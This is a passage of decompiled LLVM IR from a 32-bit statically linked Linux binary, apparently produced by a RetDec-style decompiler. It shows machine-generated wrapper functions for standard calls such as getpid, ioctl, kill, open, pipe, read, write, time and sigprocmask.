  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_805020c, { 1, 0 }
}

define i32 @function_8050214() local_unnamed_addr {
dec_label_pc_8050214:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050214 = load i32, i32* @ebx, align 4
  store i32 %v0_8050214, i32* %stack_var_-4, align 4
  %v1_805021d = call i32 @getpid(i32 %v0_8050214)
  store i32 %v1_805021d, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805021d, -4095
  br i1 %tmp7, label %dec_label_pc_8050234, label %dec_label_pc_8050228

dec_label_pc_8050228:                             ; preds = %dec_label_pc_8050214
  %v1_8050228 = call i32 @function_8050568(i32 %v0_8050214)
  %v0_805022d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805022d = sub i32 0, %v0_805022d
  %v2_805022f = inttoptr i32 %v1_8050228 to i32*
  store i32 %v1_805022d, i32* %v2_805022f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050238.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050234

dec_label_pc_8050234:                             ; preds = %dec_label_pc_8050214, %dec_label_pc_8050228
  %v2_8050238 = phi i32 [ %v0_8050214, %dec_label_pc_8050214 ], [ %v2_8050238.pre, %dec_label_pc_8050228 ]
  %v0_8050234 = phi i32 [ %v1_805021d, %dec_label_pc_8050214 ], [ -1, %dec_label_pc_8050228 ]
  %v2_8050236 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050236, i32* @edx, align 4
  store i32 %v2_8050238, i32* @ebx, align 4
  ret i32 %v0_8050234

; uselistorder directives
  uselistorder i32 %v1_805021d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050234, { 1, 0 }
}

define i32 @function_805023c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805023c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805023c = load i32, i32* @ebx, align 4
  store i32 %v0_805023c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805024f = call i32 @int80_syscall(i32 191)
  store i32 %v1_805024f, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805024f, -4095
  br i1 %tmp9, label %dec_label_pc_8050268, label %dec_label_pc_805025c

dec_label_pc_805025c:                             ; preds = %dec_label_pc_805023c
  %v1_805025c = call i32 @function_8050568(i32 %v0_805023c)
  %v0_8050261 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050261 = sub i32 0, %v0_8050261
  %v2_8050263 = inttoptr i32 %v1_805025c to i32*
  store i32 %v1_8050261, i32* %v2_8050263, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805026c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050268

dec_label_pc_8050268:                             ; preds = %dec_label_pc_805023c, %dec_label_pc_805025c
  %v2_805026c = phi i32 [ %v0_805023c, %dec_label_pc_805023c ], [ %v2_805026c.pre, %dec_label_pc_805025c ]
  %v0_8050268 = phi i32 [ %v1_805024f, %dec_label_pc_805023c ], [ -1, %dec_label_pc_805025c ]
  store i32 %v2_805026c, i32* @ebx, align 4
  ret i32 %v0_8050268

; uselistorder directives
  uselistorder i32 %v1_805024f, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_8050268, { 1, 0 }
}

define i32 @function_8050270(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050270:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050270 = load i32, i32* @edi, align 4
  store i32 %v0_8050270, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050288 = load i32, i32* @ebx, align 4
  %v2_8050290 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_8050288, i32* @ebx, align 4
  store i32 %v2_8050290, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8050290, -4095
  br i1 %tmp12, label %dec_label_pc_80502a8, label %dec_label_pc_805029c

dec_label_pc_805029c:                             ; preds = %dec_label_pc_8050270
  %v1_805029c = call i32 @function_8050568(i32 %v0_8050288)
  %v0_80502a1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80502a1 = sub i32 0, %v0_80502a1
  %v2_80502a3 = inttoptr i32 %v1_805029c to i32*
  store i32 %v1_80502a1, i32* %v2_80502a3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80502ad.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502a8

dec_label_pc_80502a8:                             ; preds = %dec_label_pc_8050270, %dec_label_pc_805029c
  %v2_80502ad = phi i32 [ %v0_8050270, %dec_label_pc_8050270 ], [ %v2_80502ad.pre, %dec_label_pc_805029c ]
  %v0_80502a8 = phi i32 [ %v2_8050290, %dec_label_pc_8050270 ], [ -1, %dec_label_pc_805029c ]
  store i32 %v2_80502ad, i32* @edi, align 4
  ret i32 %v0_80502a8

; uselistorder directives
  uselistorder i32 %v2_8050290, { 1, 0, 2 }
  uselistorder i32 %v0_8050288, { 1, 0 }
  uselistorder label %dec_label_pc_80502a8, { 1, 0 }
}

define i32 @function_80502b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80502b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80502b0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80502c3 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_80502c3, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80502c3, -4095
  br i1 %tmp9, label %dec_label_pc_80502dc, label %dec_label_pc_80502d0

dec_label_pc_80502d0:                             ; preds = %dec_label_pc_80502b0
  %v1_80502d0 = call i32 @function_8050568(i32 %v0_80502b0)
  %v0_80502d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502d5 = sub i32 0, %v0_80502d5
  %v2_80502d7 = inttoptr i32 %v1_80502d0 to i32*
  store i32 %v1_80502d5, i32* %v2_80502d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502e0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502dc

dec_label_pc_80502dc:                             ; preds = %dec_label_pc_80502b0, %dec_label_pc_80502d0
  %v2_80502e0 = phi i32 [ %v0_80502b0, %dec_label_pc_80502b0 ], [ %v2_80502e0.pre, %dec_label_pc_80502d0 ]
  %v0_80502dc = phi i32 [ %v2_80502c3, %dec_label_pc_80502b0 ], [ -1, %dec_label_pc_80502d0 ]
  %v2_80502de = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80502de, i32* @edx, align 4
  store i32 %v2_80502e0, i32* @ebx, align 4
  ret i32 %v0_80502dc

; uselistorder directives
  uselistorder i32 %v2_80502c3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80502dc, { 1, 0 }
}

define i32 @function_80502e4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80502e4:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80502e5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80502eb = sdiv i32 %sext, 16777216
  store i32 %v4_80502eb, i32* @ecx, align 4
  %v4_80502ef = ptrtoint i8* %arg1 to i32
  %v3_80502f3 = and i32 %arg2, 64
  %v4_80502f3 = icmp eq i32 %v3_80502f3, 0
  br i1 %v4_80502f3, label %dec_label_pc_8050304, label %dec_label_pc_80502f8

dec_label_pc_80502f8:                             ; preds = %dec_label_pc_80502e4
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8050304

dec_label_pc_8050304:                             ; preds = %dec_label_pc_80502e4, %dec_label_pc_80502f8
  %v0_8050304 = phi i32 [ 0, %dec_label_pc_80502e4 ], [ %phitmp, %dec_label_pc_80502f8 ]
  store i32 %v0_8050304, i32* @edx, align 4
  store i32 %v4_80502ef, i32* %ebx.global-to-local, align 4
  %v5_805030f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80502eb)
  store i32 %v5_805030f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805030f, -4095
  br i1 %tmp15, label %dec_label_pc_8050327, label %dec_label_pc_805031b

dec_label_pc_805031b:                             ; preds = %dec_label_pc_8050304
  %v1_805031b = call i32 @function_8050568(i32 %v0_80502e5)
  %v0_8050320 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050320 = sub i32 0, %v0_8050320
  %v2_8050322 = inttoptr i32 %v1_805031b to i32*
  store i32 %v1_8050320, i32* %v2_8050322, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_8050304, %dec_label_pc_805031b
  %v0_8050327 = phi i32 [ %v5_805030f, %dec_label_pc_8050304 ], [ -1, %dec_label_pc_805031b ]
  store i32 %v0_80502e5, i32* @ebx, align 4
  ret i32 %v0_8050327

; uselistorder directives
  uselistorder i32 %v5_805030f, { 1, 0, 2 }
  uselistorder i32 %v4_80502eb, { 1, 0 }
  uselistorder i32 %v0_80502e5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050327, { 1, 0 }
  uselistorder label %dec_label_pc_8050304, { 1, 0 }
}

define i32 @function_805032f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805032f:
  %v3_805033f = inttoptr i32 %arg1 to i8*
  %v4_805033f = call i32 @function_80502e4(i8* %v3_805033f, i32 577)
  ret i32 %v4_805033f
}

define i32 @function_8050348(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050348:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050348 = load i32, i32* @edi, align 4
  store i32 %v0_8050348, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050350 = load i32, i32* @ebx, align 4
  %v1_8050358 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050358 = call i32 @pipe([2 x i32] %v1_8050358)
  store i32 %v0_8050350, i32* @ebx, align 4
  store i32 %v2_8050358, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050358, -4095
  br i1 %tmp9, label %dec_label_pc_8050370, label %dec_label_pc_8050364

dec_label_pc_8050364:                             ; preds = %dec_label_pc_8050348
  %v1_8050364 = call i32 @function_8050568(i32 %v0_8050350)
  %v0_8050369 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050369 = sub i32 0, %v0_8050369
  %v2_805036b = inttoptr i32 %v1_8050364 to i32*
  store i32 %v1_8050369, i32* %v2_805036b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050374.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050370

dec_label_pc_8050370:                             ; preds = %dec_label_pc_8050348, %dec_label_pc_8050364
  %v2_8050374 = phi i32 [ %v0_8050348, %dec_label_pc_8050348 ], [ %v2_8050374.pre, %dec_label_pc_8050364 ]
  %v0_8050370 = phi i32 [ %v2_8050358, %dec_label_pc_8050348 ], [ -1, %dec_label_pc_8050364 ]
  store i32 %v2_8050374, i32* @edi, align 4
  ret i32 %v0_8050370

; uselistorder directives
  uselistorder i32 %v2_8050358, { 1, 0, 2 }
  uselistorder i32 %v0_8050350, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050370, { 1, 0 }
}

define i32 @function_80503b8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80503b8:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80503b8 = load i32, i32* @edi, align 4
  store i32 %v0_80503b8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80503c8 = load i32, i32* @ebx, align 4
  %v4_80503d0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80503c8, i32* @ebx, align 4
  store i32 %v4_80503d0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_80503d0, -4095
  br i1 %tmp12, label %dec_label_pc_80503e8, label %dec_label_pc_80503dc

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_80503b8
  %v1_80503dc = call i32 @function_8050568(i32 %v0_80503c8)
  %v0_80503e1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80503e1 = sub i32 0, %v0_80503e1
  %v2_80503e3 = inttoptr i32 %v1_80503dc to i32*
  store i32 %v1_80503e1, i32* %v2_80503e3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80503ec.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80503e8

dec_label_pc_80503e8:                             ; preds = %dec_label_pc_80503b8, %dec_label_pc_80503dc
  %v2_80503ec = phi i32 [ %v0_80503b8, %dec_label_pc_80503b8 ], [ %v2_80503ec.pre, %dec_label_pc_80503dc ]
  %v0_80503e8 = phi i32 [ %v4_80503d0, %dec_label_pc_80503b8 ], [ -1, %dec_label_pc_80503dc ]
  store i32 %v2_80503ec, i32* @edi, align 4
  ret i32 %v0_80503e8

; uselistorder directives
  uselistorder i32 %v4_80503d0, { 1, 0, 2 }
  uselistorder i32 %v0_80503c8, { 1, 0 }
  uselistorder label %dec_label_pc_80503e8, { 1, 0 }
}

define i32 @function_80503f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80503f0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80503f1 = load i32, i32* @esi, align 4
  store i32 %v0_80503f1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8050409 = load i32, i32* @ebx, align 4
  %v1_8050411 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050409, i32* @ebx, align 4
  store i32 %v1_8050411, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8050411, -4095
  br i1 %tmp12, label %dec_label_pc_8050429, label %dec_label_pc_805041d

dec_label_pc_805041d:                             ; preds = %dec_label_pc_80503f0
  %v1_805041d = call i32 @function_8050568(i32 %v0_8050409)
  %v0_8050422 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050422 = sub i32 0, %v0_8050422
  %v2_8050424 = inttoptr i32 %v1_805041d to i32*
  store i32 %v1_8050422, i32* %v2_8050424, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805042c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8050429

dec_label_pc_8050429:                             ; preds = %dec_label_pc_80503f0, %dec_label_pc_805041d
  %v2_805042c = phi i32 [ %v0_80503f1, %dec_label_pc_80503f0 ], [ %v2_805042c.pre, %dec_label_pc_805041d ]
  %v0_8050429 = phi i32 [ %v1_8050411, %dec_label_pc_80503f0 ], [ -1, %dec_label_pc_805041d ]
  %v2_805042b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805042b, i32* @edx, align 4
  store i32 %v2_805042c, i32* @esi, align 4
  ret i32 %v0_8050429

; uselistorder directives
  uselistorder i32 %v1_8050411, { 1, 0, 2 }
  uselistorder i32 %v0_8050409, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8050429, { 1, 0 }
}

define i32 @function_8050458(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050458:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8050459 = load i32, i32* @esi, align 4
  %v4_805045d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805045d, i32* @ecx, align 4
  %v2_8050469 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8050469, label %dec_label_pc_8050482, label %dec_label_pc_805046d

dec_label_pc_805046d:                             ; preds = %dec_label_pc_8050458
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8050482, label %dec_label_pc_8050472

dec_label_pc_8050472:                             ; preds = %dec_label_pc_805046d
  %v1_8050472 = call i32 @function_8050568(i32 %v0_8050459)
  %v1_8050477 = inttoptr i32 %v1_8050472 to i32*
  store i32 22, i32* %v1_8050477, align 4
  br label %dec_label_pc_80504a9

dec_label_pc_8050482:                             ; preds = %dec_label_pc_805046d, %dec_label_pc_8050458
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8050487 = load i32, i32* @ebx, align 4
  %v7_805048f = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8050487, i32* @ebx, align 4
  store i32 %v7_805048f, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_805048f, -4095
  br i1 %tmp12, label %dec_label_pc_80504a9, label %dec_label_pc_805049b

dec_label_pc_805049b:                             ; preds = %dec_label_pc_8050482
  %v1_805049b = call i32 @function_8050568(i32 %v0_8050487)
  %v0_80504a0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80504a0 = sub i32 0, %v0_80504a0
  %v2_80504a2 = inttoptr i32 %v1_805049b to i32*
  store i32 %v1_80504a0, i32* %v2_80504a2, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504a9

dec_label_pc_80504a9:                             ; preds = %dec_label_pc_805049b, %dec_label_pc_8050482, %dec_label_pc_8050472
  %storemerge = phi i32 [ -1, %dec_label_pc_8050472 ], [ %v7_805048f, %dec_label_pc_8050482 ], [ -1, %dec_label_pc_805049b ]
  %v2_80504a9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80504a9, i32* @edx, align 4
  store i32 %v0_8050459, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805048f, { 1, 0, 2 }
  uselistorder i32 %v0_8050487, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80504b0(i32* %arg1) local_unnamed_addr {
dec_label_pc_80504b0:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80504b0 = load i32, i32* @edi, align 4
  store i32 %v0_80504b0, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80504b8 = load i32, i32* @ebx, align 4
  %v2_80504c0 = call i32 @time(i32* %arg1)
  store i32 %v0_80504b8, i32* @ebx, align 4
  store i32 %v2_80504c0, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_80504c0, -4095
  br i1 %tmp10, label %dec_label_pc_80504d8, label %dec_label_pc_80504cc

dec_label_pc_80504cc:                             ; preds = %dec_label_pc_80504b0
  %v1_80504cc = call i32 @function_8050568(i32 %v0_80504b8)
  %v0_80504d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80504d1 = sub i32 0, %v0_80504d1
  %v2_80504d3 = inttoptr i32 %v1_80504cc to i32*
  store i32 %v1_80504d1, i32* %v2_80504d3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80504dc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80504d8

dec_label_pc_80504d8:                             ; preds = %dec_label_pc_80504b0, %dec_label_pc_80504cc
  %v2_80504dc = phi i32 [ %v0_80504b0, %dec_label_pc_80504b0 ], [ %v2_80504dc.pre, %dec_label_pc_80504cc ]
  %v0_80504d8 = phi i32 [ %v2_80504c0, %dec_label_pc_80504b0 ], [ -1, %dec_label_pc_80504cc ]
  store i32 %v2_80504dc, i32* @edi, align 4
  ret i32 %v0_80504d8

; uselistorder directives
  uselistorder i32 %v2_80504c0, { 1, 0, 2 }
  uselistorder i32 %v0_80504b8, { 1, 0 }
  uselistorder label %dec_label_pc_80504d8, { 1, 0 }
}

define i32 @function_80504e0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80504e0:
  %v5_80504f1 = call i32 @function_8053b3c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_80504f1
}

define i32 @function_80504fc(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80504fc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80504fc = load i32, i32* @edi, align 4
  store i32 %v0_80504fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805050c = load i32, i32* @ebx, align 4
  %v4_8050514 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805050c, i32* @ebx, align 4
  store i32 %v4_8050514, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8050514, -4095
  br i1 %tmp12, label %dec_label_pc_805052c, label %dec_label_pc_8050520

dec_label_pc_8050520:                             ; preds = %dec_label_pc_80504fc
  %v1_8050520 = call i32 @function_8050568(i32 %v0_805050c)
  %v0_8050525 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050525 = sub i32 0, %v0_8050525
  %v2_8050527 = inttoptr i32 %v1_8050520 to i32*
  store i32 %v1_8050525, i32* %v2_8050527, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050530.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805052c

dec_label_pc_805052c:                             ; preds = %dec_label_pc_80504fc, %dec_label_pc_8050520
  %v2_8050530 = phi i32 [ %v0_80504fc, %dec_label_pc_80504fc ], [ %v2_8050530.pre, %dec_label_pc_8050520 ]
  %v0_805052c = phi i32 [ %v4_8050514, %dec_label_pc_80504fc ], [ -1, %dec_label_pc_8050520 ]
  %v2_805052e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805052e, i32* @edx, align 4
  store i32 %v2_8050530, i32* @edi, align 4
  ret i32 %v0_805052c

; uselistorder directives
  uselistorder i32 %v4_8050514, { 1, 0, 2 }
  uselistorder i32 %v0_805050c, { 1, 0 }
  uselistorder label %dec_label_pc_805052c, { 1, 0 }
}

define i32 @function_8050534(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050534:
  %v0_8050538 = load i32, i32* inttoptr (i32 134600220 to i32*), align 4
  %v2_805053d = mul i32 %arg1, 2
  %v3_805053d = add i32 %v0_8050538, %v2_805053d
  %v4_805053d = inttoptr i32 %v3_805053d to i16*
  %v5_805053d = load i16, i16* %v4_805053d, align 2
  %v6_805053d = zext i16 %v5_805053d to i32
  %v1_8050541 = and i32 %v6_805053d, 32
  ret i32 %v1_8050541
}

define i32 @function_8050548(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050548:
  store i32 %arg1, i32* @edx, align 4
  %v1_805054c = add i32 %arg1, 128
  %v6_8050557 = icmp ugt i32 %v1_805054c, 383
  br i1 %v6_8050557, label %dec_label_pc_8050562, label %dec_label_pc_8050559

dec_label_pc_8050559:                             ; preds = %dec_label_pc_8050548
  %v0_8050559 = load i32, i32* inttoptr (i32 134600228 to i32*), align 4
  %v2_805055e = mul i32 %arg1, 2
  %v3_805055e = add i32 %v0_8050559, %v2_805055e
  %v4_805055e = inttoptr i32 %v3_805055e to i16*
  %v5_805055e = load i16, i16* %v4_805055e, align 2
  %v6_805055e = sext i16 %v5_805055e to i32
  store i32 %v6_805055e, i32* @edx, align 4
  br label %dec_label_pc_8050562

dec_label_pc_8050562:                             ; preds = %dec_label_pc_8050548, %dec_label_pc_8050559
  %v0_8050562 = phi i32 [ %arg1, %dec_label_pc_8050548 ], [ %v6_805055e, %dec_label_pc_8050559 ]
  ret i32 %v0_8050562

; uselistorder directives
  uselistorder label %dec_label_pc_8050562, { 1, 0 }
}

define i32 @function_8050568(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050568:
  ret i32 ptrtoint (i32* @global_var_8063b20.305 to i32)
}

define i32 @function_8050570(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050570:
  %stack_var_12 = alloca i32, align 4
  %v2_8050573 = ptrtoint i32* %stack_var_12 to i32
  %v4_8050586 = inttoptr i32 %arg1 to i8*
  %v5_8050586 = call i32 @function_8050590(i8* %v4_8050586, i32 -1, i32 %arg2, i32 %v2_8050573)
  ret i32 %v5_8050586
}

define i32 @function_8050590(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050590:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050590 = load i32, i32* @ebp, align 4
  %v0_8050591 = load i32, i32* @edi, align 4
  %v0_8050592 = load i32, i32* @esi, align 4
  %v0_8050593 = load i32, i32* @ebx, align 4
  store i32 %v0_8050593, i32* %stack_var_-16, align 4
  %v4_8050597 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050597, i32* @esi, align 4
  %v2_805059b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_80505cc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_80505cc, i32* @ebp, align 4
  %v1_80505d0 = sub i32 -1, %v4_8050597
  %v1_80505d3 = call i32 @function_80506a5(i32 %v2_805059b)
  %v1_80505e3 = load i32, i32* @edi, align 4
  %tmp34 = icmp ugt i32 %v1_80505d0, %v1_80505e3
  br i1 %tmp34, label %dec_label_pc_80505e7, label %dec_label_pc_80505e9

dec_label_pc_80505e7:                             ; preds = %dec_label_pc_8050590
  br label %dec_label_pc_80505e9

dec_label_pc_80505e9:                             ; preds = %dec_label_pc_8050590, %dec_label_pc_80505e7
  %v1_80505e9 = phi i32 [ %v1_80505d0, %dec_label_pc_8050590 ], [ %v1_80505e3, %dec_label_pc_80505e7 ]
  %v0_80505e9 = load i32, i32* @esi, align 4
  %v2_80505e9 = add i32 %v0_80505e9, %v1_80505e9
  %v4_8050614 = inttoptr i32 %arg3 to i8*
  %v5_8050614 = call i32 @function_8050810(i32 %v2_80505cc, i8* %v4_8050614, i32 %arg4, i32 %v2_80505e9)
  store i32 %v5_8050614, i32* %edx.global-to-local, align 4
  %v0_805061e = load i32, i32* @ebx, align 4
  %v1_805061e = icmp eq i32 %v0_805061e, 0
  br i1 %v1_805061e, label %dec_label_pc_8050638, label %dec_label_pc_8050622

dec_label_pc_8050622:                             ; preds = %dec_label_pc_80505e9
  %v16_8050626 = icmp eq i32 %v1_80505e9, 0
  %v1_805062a = icmp eq i1 %v16_8050626, false
  br i1 %v1_805062a, label %dec_label_pc_8050631, label %dec_label_pc_805062c

dec_label_pc_805062c:                             ; preds = %dec_label_pc_8050622
  %v1_805062c = add i32 %v2_80505e9, -1
  br label %dec_label_pc_8050631

dec_label_pc_8050631:                             ; preds = %dec_label_pc_8050622, %dec_label_pc_805062c
  %stack_var_-80.0.in = phi i32 [ %v0_80505e9, %dec_label_pc_8050622 ], [ %v1_805062c, %dec_label_pc_805062c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805063b.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_805063d.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050638

dec_label_pc_8050638:                             ; preds = %dec_label_pc_80505e9, %dec_label_pc_8050631
  %v2_805063d = phi i32 [ %v0_8050593, %dec_label_pc_80505e9 ], [ %v2_805063d.pre, %dec_label_pc_8050631 ]
  %v0_805063b = phi i32 [ %v5_8050614, %dec_label_pc_80505e9 ], [ %v0_805063b.pre, %dec_label_pc_8050631 ]
  store i32 %v2_805063d, i32* @ebx, align 4
  store i32 %v0_8050592, i32* @esi, align 4
  store i32 %v0_8050591, i32* @edi, align 4
  store i32 %v0_8050590, i32* @ebp, align 4
  ret i32 %v0_805063b

; uselistorder directives
  uselistorder i32 %v0_80505e9, { 1, 0 }
  uselistorder i32 %v1_80505e9, { 1, 0 }
  uselistorder i32 %v1_80505e3, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_8050638, { 1, 0 }
  uselistorder label %dec_label_pc_8050631, { 1, 0 }
  uselistorder label %dec_label_pc_80505e9, { 1, 0 }
}

define i32 @function_8050644() local_unnamed_addr {
dec_label_pc_8050644:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050645 = load i32, i32* @edi, align 4
  %v0_8050646 = load i32, i32* @esi, align 4
  %v0_8050647 = load i32, i32* @ebx, align 4
